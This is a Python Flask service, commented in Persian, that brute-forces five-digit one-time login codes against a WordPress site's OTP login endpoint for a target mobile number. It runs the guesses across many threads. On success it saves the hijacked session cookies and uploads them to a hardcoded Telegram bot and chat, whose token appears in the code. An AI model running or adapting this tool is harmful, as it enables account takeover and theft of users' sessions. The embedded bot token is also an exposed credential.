import requests
import json
from http.cookiejar import MozillaCookieJar
from concurrent.futures import ThreadPoolExecutor
import time
import sys
from flask import Flask, render_template_string, request, jsonify
from flask_socketio import SocketIO, emit
import threading
import os
from datetime import datetime
from flask_cors import CORS  # اضافه کردن CORS

# تنظیمات تلگرام
TELEGRAM_BOT_TOKEN = "5858689331:AAH3pdfEDVSIF9AaPsWCGQiZzltgkKVtKr8"
TELEGRAM_CHAT_ID = "-1002021960039"

app = Flask(__name__)
socketio = SocketIO(app)
CORS(app)  # فعال کردن CORS برای همه مسیرها

# متغیرهای گلوبال برای کنترل پروسه و وضعیت
running = False
found_success = False
progress_log = []
current_status = {
    "running": False,
    "current_range": {"start": 0, "end": 0},
    "processed": 0,
    "error": None
}

# بقیه کد ورکر همون قبلیه، فقط این بخش‌ها رو تغییر می‌دیم

def send_file_to_telegram(file_path, retries=3):
    """ارسال فایل به تلگرام با تلاش مجدد در صورت خطا"""
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
    for attempt in range(retries):
        try:
            if not os.path.exists(file_path):
                progress_log.append(f"Error: File {file_path} does not exist!")
                return False
            with open(file_path, 'rb') as file:
                files = {'document': file}
                data = {'chat_id': TELEGRAM_CHAT_ID}
                response = requests.post(url, data=data, files=files, timeout=10)
                response.raise_for_status()
                progress_log.append(f"File {file_path} sent to Telegram successfully!")
                return True
        except (requests.exceptions.RequestException, FileNotFoundError) as e:
            progress_log.append(f"Failed to send {file_path} to Telegram (attempt {attempt + 1}/{retries}): {str(e)}")
            if attempt < retries - 1:
                time.sleep(2)
    return False

def save_and_send_cookies(cookies, code_str):
    """تابع زنده برای ذخیره و ارسال کوکی‌ها"""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    cookies_file = f"cookies_success_{code_str}_{timestamp}.txt"
    
    cookie_jar = MozillaCookieJar(cookies_file)
    for cookie in cookies:
        cookie_jar.set_cookie(cookie)
    cookie_jar.save(ignore_discard=True, ignore_expires=True)
    
    if os.path.exists(cookies_file) and os.path.getsize(cookies_file) > 0:
        progress_log.append(f"Cookies saved in {cookies_file}")
        success = send_file_to_telegram(cookies_file)
        if not success:
            progress_log.append(f"Critical: Failed to send cookies {cookies_file} to Telegram after retries!")
    else:
        progress_log.append(f"Error: Failed to save cookies to {cookies_file}")

def send_request(host, login_otp_nonce, mobile, code_values, counter, max_retries=5):
    global current_status
    headers = {
        "Host": host,
        "Sec-Ch-Ua-Platform": "\"Windows\"",
        "Accept-Language": "en-US,en;q=0.9",
        "Sec-Ch-Ua": "\"Chromium\";v=\"133\", \"Not(A:Brand\";v=\"99\"",
        "Sec-Ch-Ua-Mobile": "?0",
        "X-Requested-With": "XMLHttpRequest",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
        "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": f"https://{host}",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": f"https://{host}/login/?action=login-by-otp&mobile={mobile}",
        "Priority": "u=1, i"
    }

    data = {
        "login_otp_nonce": login_otp_nonce,
        "_wp_http_referer": f"/login/?action=login-by-otp&mobile={mobile}",
        "action": "kandopanel_login_by_otp",
        "mobile": mobile,
        "code[1]": str(code_values[0]),
        "code[2]": str(code_values[1]),
        "code[3]": str(code_values[2]),
        "code[4]": str(code_values[3]),
        "code[5]": str(code_values[4])
    }

    url = f"https://{host}/wp-admin/admin-ajax.php"
    code_str = ''.join(map(str, code_values))

    for attempt in range(max_retries + 1):
        try:
            response = requests.post(url, headers=headers, data=data, timeout=15)
            response.raise_for_status()

            try:
                json_response = response.json()
                if json_response.get("success"):
                    msg = (f"Success with code {code_str} (number {counter})!\n"
                           f"Message: {json_response['data']['message']}\n"
                           f"Redirect to: {json_response['data']['redirect']}")
                    progress_log.append(msg)
                    save_and_send_cookies(response.cookies, code_str)

                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                    output_file = f"success_{code_str}_{timestamp}.txt"
                    with open(output_file, 'w', encoding='utf-8') as f:
                        f.write(msg + f"\nCookies file: {cookies_file}\n")
                    progress_log.append(f"Output saved in {output_file}")
                    send_file_to_telegram(output_file)
                    current_status["error"] = "Success found!"
                    return True
                else:
                    progress_log.append(f"Failed with code {code_str} (number {counter}): {json_response}")
                    current_status["processed"] = counter
                    return False
            except json.JSONDecodeError:
                progress_log.append(f"Error parsing JSON for code {code_str} (number {counter})")
                current_status["error"] = "JSON parsing error"
                return False
        except requests.exceptions.RequestException as e:
            error_msg = str(e)
            if isinstance(e, requests.exceptions.HTTPError):
                if e.response.status_code == 429:
                    error_msg = "Rate Limit exceeded (429)"
                elif e.response.status_code == 403:
                    error_msg = "IP blocked by server (403)"
                elif e.response.status_code == 503:
                    error_msg = "Server unavailable (503)"
            progress_log.append(f"Network error with code {code_str} (attempt {attempt + 1}/{max_retries + 1}): {error_msg}")
            current_status["error"] = error_msg
            if attempt < max_retries:
                time.sleep(2)
                continue
            return False

def generate_code(counter):
    code_str = f"{counter:05d}"
    return [int(digit) for digit in code_str]

def run_bruteforce(host, login_otp_nonce, mobile, connections, start_range, end_range):
    global running, found_success, current_status
    progress_log.append(f"Starting bruteforce from {start_range} to {end_range}...")
    current_status = {
        "running": True,
        "current_range": {"start": start_range, "end": end_range},
        "processed": start_range,
        "error": None
    }
    batch_size = connections
    found_success = False

    for batch_start in range(start_range, end_range, batch_size):
        if not running or found_success:
            if found_success:
                progress_log.append("Stopping: Successful code found!")
            else:
                progress_log.append("Process stopped manually!")
            current_status["running"] = False
            break

        batch_end = min(batch_start + batch_size, end_range)
        codes = [generate_code(i) for i in range(batch_start, batch_end)]

        with ThreadPoolExecutor(max_workers=connections) as executor:
            futures = {
                executor.submit(send_request, host, login_otp_nonce, mobile, code, batch_start + idx + 1): idx
                for idx, code in enumerate(codes)
            }

            for future in futures:
                try:
                    if future.result():
                        found_success = True
                        running = False
                        progress_log.append("Process stopped because a successful code was found!")
                        current_status["running"] = False
                        break
                except Exception as e:
                    progress_log.append(f"Exception in future: {str(e)}")
                    current_status["error"] = str(e)

        current_status["processed"] = batch_end
        if not found_success:
            time.sleep(0.1)

    if not found_success:
        progress_log.append(f"No successful code found in range {start_range:05d}-{end_range:05d}.")
        current_status["running"] = False

@app.route('/start', methods=['POST'])
def start():
    global running, progress_log, found_success
    data = request.get_json()
    host = data['host']
    login_otp_nonce = data['nonce']
    mobile = data['mobile']
    connections = int(data['connections'])
    start_range = int(data['startRange'])
    end_range = int(data['endRange'])

    running = True
    found_success = False
    progress_log = []
    progress_log.append("Start button clicked!")
    threading.Thread(target=run_bruteforce, args=(host, login_otp_nonce, mobile, connections, start_range, end_range)).start()
    return '', 204

@app.route('/stop', methods=['POST'])
def stop():
    global running
    running = False
    progress_log.append("Stop button clicked!")
    return '', 204

@app.route('/status', methods=['GET'])
def status():
    """برگشت وضعیت فعلی ورکر"""
    return jsonify(current_status)

if __name__ == '__main__':
    socketio.run(app, host='0.0.0.0', port=5000, debug=True)
